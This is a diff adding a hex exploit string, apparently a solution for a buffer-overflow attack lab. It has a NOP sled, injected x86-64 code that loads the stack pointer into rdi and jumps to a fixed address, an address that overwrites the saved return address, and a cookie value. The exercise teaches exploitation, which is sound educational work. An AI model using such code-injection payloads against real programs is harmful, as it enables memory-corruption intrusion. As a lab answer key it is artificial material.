@@ -1,0 +1,8 @@
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90
+48 89 e7             	/* mov    %rsp,%rdi */
+68 fa 18 40 00       	/* push   $0x4018fa */
+c3                   	/* ret */
+78 dc 61 55 00 00 00 00 /* begining of the buffer to overwrite the return address */
+35 39 62 39 39 37 66 61 /* cookie */
